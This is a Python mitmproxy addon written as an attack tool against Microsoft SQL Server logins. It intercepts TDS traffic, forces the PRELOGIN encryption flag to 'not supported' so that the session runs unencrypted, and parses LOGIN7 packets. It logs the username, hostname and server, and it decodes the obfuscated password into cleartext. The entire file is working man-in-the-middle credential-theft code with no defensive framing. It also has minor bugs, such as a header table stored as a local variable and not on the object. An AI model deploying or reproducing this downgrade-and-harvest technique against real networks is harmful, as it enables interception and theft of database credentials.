import logging

from mitmproxy.utils import strutils
from mitmproxy import tcp
import sys
import struct

class MSSQL_auth_downgrader:
    def __init__(self):
        logging.info("MSSQL Downgrade Addon activated")
        hdr_types = {
            0x12: "PRELOGIN",
            0x04: "Tabular Response",
            16: "LOGIN7",
            1: "SQL Batch",
            2: "Pre-TDS7 Login",
            3: "RPC",
            7: "Bulk load data",
            17: "SSPI"
        }

    def tcp_message(self, flow: tcp.TCPFlow):
        message = flow.messages[-1]
        tdsdata = bytearray(message.content)
        if message.from_client:
            message.content = self.mangle_packet_from_client(tdsdata)
        else:
            message.content = self.mangle_packet_from_server(tdsdata)

    def get_header_type (self, packet):
        hdr_type = struct.unpack("B", packet[0].to_bytes(1,'big'))[0]
        return self.hdr_types.get(hdr_type, "Unknown")
    
    def mangle_packet_from_client(self, packet):
        header_type = self.get_header_type(packet)
        pl = packet[8:len(packet)]
        if header_type == 'PRELOGIN':
            pl = self.modify_prelogin(pl)
            return packet[0:8] + pl
        elif header_type == "LOGIN7":
            pl = self.parse_login7(pl)
            return packet[0:8] + pl
        return packet
    
    def mangle_packet_from_server(self, packet):
        header_type = self.get_header_type(packet)
        pl = packet[8:len(packet)]
        if header_type == 'PRELOGIN':
            pl = self.modify_prelogin(pl)
            return packet[0:8] + pl
        return packet
    
    def modify_prelogin(self, prelogin):
        if not prelogin:
            return prelogin
        i = 0
        while struct.unpack('B', prelogin[i].to_bytes(1,'big'))[0] != 0xFF :
            position, length = struct.unpack(">HH", prelogin[i+1:i+5])
            option_token = struct.unpack("B", prelogin[i].to_bytes(1,'big'))[0]
            if option_token == 0x00: # PL_OPTION_TOKEN == VERSION
                if length != 6:
                    #"Error: AARGGH! Out of spec or parsing fubar! version length: 0x%X\n"
                    logging.info(f"Error: Skipping current packet - PL_OPTION_TOKEN == VERSION - pos:{position}, length:{length}, opt:{option_token}")
                    return prelogin
                version, subbuild = struct.unpack(">LH", prelogin[position:position+length])
                logging.info(f"version: {version} + subbuild: {subbuild}")
            elif option_token == 0x01: # PL_OPTION_TOKEN == ENCRYPTION
                if length != 1:
                    # "Error: AARGGH! Out of spec or parsing fubar! encryption length
                    logging.info(f"Error: Skipping current packet - PL_OPTION_TOKEN == ENCRYPTION - pos:{position}, length:{length}, opt:{option_token}")
                    return prelogin
                enc = struct.unpack("B", prelogin[position].to_bytes(1,'big'))[0]
                if enc == 0x00:
                    logging.info("ENCRYPT is set to ENCRYPT_OFF")
                elif enc == 0x01:
                    logging.info("ENCRYPT is set to ENCRYPT_ON")
                    logging.info("Depending on the used client, the attack will probably not succeed!")
                elif enc == 0x02:
                    logging.info("ENCRYPT is set to ENCRYPT_NOT_SUP")
                    logging.info("Encryption is not supported, we will be able to see the cleartext password")
                elif enc == 0x03:
                    logging.info("ENCRYPT is set to ENCRYPT_REQ")
                    logging.info("This suggests a secure configuration!")
                else:
                    logging.info("ENCRYPT set to 0x" + str(enc) + " for some reason. This is out of spec... Let's skip it!")
                    return packet
            
                if enc != 0x02:
                    logging.info("Setting to: ENCRYPT_NOT_SUP == 0x02")
                    prelogin[position] = 2
                
                break # we did the evil deed, so we can leave the loop...
            i += 5
        return prelogin
    
    def parse_login7(self, tds_pl): # just the tds packet paylod, without header
        logging.info("Found TDS LOGIN7 packet, dumping information:")
        logging.info("#############################################")
        names = ['HostName', 'UserName', 'Password','Application', 'Server', None, 'Library']
        offsets = range(36, 63, 4)

        for name, offset in zip(names, offsets):
            if name is not None:
                offset, length = struct.unpack("<HH", tds_pl[offset:offset+4])
                length *= 2 # since we are parsing unicode widechars...
                val = tds_pl[offset:offset+length]
                if name == "Password":
                    password = self.decode_tds_password(val)
                    logging.info(f"{name}: {password}")
                else:
                    logging.info(f"{name}: {val.decode('utf16')}")

        logging.info("#############################################")
        return tds_pl
    
    def decode_tds_password(self, password):
        # This function decodes the password...
        # note that this is the reverse thing to
        # Msf::Exploit::Remote::MSSQL.mssql_tds_encrypt
        #citing MS-TDS specification:
        #\"Before submitting a password from the client to the server, for
        #every byte in the password buffer starting with the position pointed
        #to by IbPassword, the client SHOULD first swap the four high bits
        #with the four low bits and then do a bit-XOR with 0xA5 (10100101). After
        #reading a submitted password, for every byte in the password buffer 
        #starting with the position pointed to by IbPassword, the server SHOULD 
        #first do a bit-XOR with 0xA5 (10100101) and then swap the four high bits 
        #with the four low bits.\""""
        if password is None or len(password) == 0:
            return password
        password = list(password)
        plain = []
        for char in password:
            # a = ord(char) ^ 0xA5
            a = char ^ 0xA5
            high = (a & 0xf0) >> 4
            low = (a & 0x0f) << 4
            a = high ^ low
            if a != 0:
                plain.append(chr(a))
        return ''.join(plain)
    
addons = [
    MSSQL_auth_downgrader()
]